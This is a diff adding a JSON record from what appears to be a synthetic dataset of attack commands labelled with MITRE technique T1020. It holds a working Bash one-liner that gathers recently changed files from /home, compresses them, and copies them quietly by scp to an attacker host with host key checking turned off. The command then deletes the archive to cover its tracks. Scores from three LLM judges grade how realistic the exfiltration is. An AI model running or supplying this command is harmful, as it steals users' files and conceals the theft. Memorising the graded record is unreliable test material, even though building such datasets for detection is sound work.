@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); find /home -type f -mmin -60 -size -25M -print0 | tar --null -T - -czf /tmp/home_recent_${ts}.tgz >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/home_recent_${ts}.tgz attacker@203.0.113.7:/var/tmp/.cache/home/ >/dev/null 2>&1 && rm -f /tmp/home_recent_${ts}.tgz",
+  "explanation": "Targets recently modified user files under 25MB, compresses them, and exfiltrates via scp with non-interactive authentication and minimal output.",
+  "rationale_steps": [
+    "Use find to select likely interesting recent files while avoiding very large transfers.",
+    "Create a compressed tarball to consolidate and shrink data for efficient exfiltration.",
+    "Transfer with scp quietly, using an SSH key to avoid prompts.",
+    "Cleanup removes temporary data to reduce chances of discovery."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-f37f9999",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash pipeline using valid find, tar, and scp flags with proper piping, redirections, and variable expansion.",
+        "semantic_score": 4,
+        "semantic_justification": "It packages recent files and exfiltrates them via scp in a non-interactive, quiet manner consistent with automated exfiltration, but realism is reduced by referencing /root/.ssh/id_rsa when running without elevated privileges and the lack of scheduling.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:48:53.337669Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags, correct command separators (&&), and appropriate redirection of output.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by finding recent files, compressing them with tar, transferring them via SCP to an external server, and cleaning up traces - all core elements of T1020.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:48:56.153738Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid syntax, balanced operators, and correctly used flags for all constituent commands.",
+        "semantic_score": 3,
+        "semantic_justification": "The command correctly identifies, compresses, and attempts to exfiltrate data via SCP, aligning with T1020, but the specified SSH key path `/root/.ssh/id_rsa` is inaccessible under the stated 'Privilege: None', rendering the critical exfiltration step inoperable.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:33:23.299517Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
